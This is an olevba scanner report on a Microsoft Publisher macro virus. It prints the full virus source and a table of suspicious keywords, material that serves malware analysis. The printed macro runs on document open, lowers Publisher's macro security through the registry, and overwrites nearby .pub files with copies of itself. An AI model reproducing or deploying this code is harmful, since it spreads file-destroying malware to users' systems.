olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSPublisher.Avarta.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSPublisher.Avarta.a - OLE stream: 'VBA/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'[TLAHUIZCALPANTECUHTLI]
Option Explicit
Dim intR As Integer
Dim strFln As String
Dim objReg As Object
Dim strRfl As String
Dim objFso As Object
Dim strDir As String
Dim intI As Integer
Dim intL As Integer
Dim intC As Integer
Dim strLsb As String
Private Sub Document_Open()
On Error Resume Next
ActiveDocument.ActiveWindow.Visible = False
intR = Sin(Second(Time)) + Rnd
strFln = "File" & intR + 2
Set objReg = CreateObject("Wscript.Shell")
objReg.RegWrite "HKCU\Software\Microsoft\Office\11.0\Publisher\Security\Level", 1, "REG_DWORD"
strRfl = objReg.RegRead("HKCU\Software\Microsoft\Office\11.0\Publisher\Recent File List\" & strFln)
Set objFso = CreateObject("Scripting.FileSystemObject")
strDir = objFso.GetSpecialFolder(0) & "\System\"
With Application.FileSearch
    .Filename = "*.pub"
    .LookIn = strFpt(strRfl)
    .Execute
    For intI = 1 To .FoundFiles.Count
        If .FoundFiles(intI) <> ActiveDocument.FullName Then
            If Dir(strDir & strFrn(.FoundFiles(intI))) = "" Then
                objFso.CopyFile .FoundFiles(intI), strDir & strFrn(.FoundFiles(intI))
                objFso.CopyFile ActiveDocument.FullName, .FoundFiles(intI), True
            End If
        End If
    Next
End With
Application.Open strDir & strFrn(ActiveDocument.FullName), False, False
'Dedicated to Tlahuizcalpantecuhtli. He is nice.
'But this is only shit... fuqin' publisher's VBA.
'Fak u Micro$oft!
'(c) A. V., 07D5
End Sub
Private Function strFrn(strRfl) As String
On Error Resume Next
intL = Len(strRfl)
For intC = 1 To Len(strRfl)
    strLsb = Mid(strRfl, intL, 1)
    If strLsb = "\" Then
        strLsb = "$"
    End If
    If strLsb = ":" Then
        strLsb = "~"
    End If
    strFrn = strLsb + strFrn
    intL = intL - 1
Next
strFrn = strFrn & "$"
End Function
Private Function strFpt(strRfl) As String
On Error Resume Next
intL = Len(strRfl)
For intC = 1 To Len(strRfl)
    strLsb = Mid(strRfl, intL, 1)
    If strLsb = "\" Then
        strFpt = Mid(strRfl, 1, Len(strRfl) - intC)
        GoTo Result
    End If
    intL = intL - 1
Next
Result:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

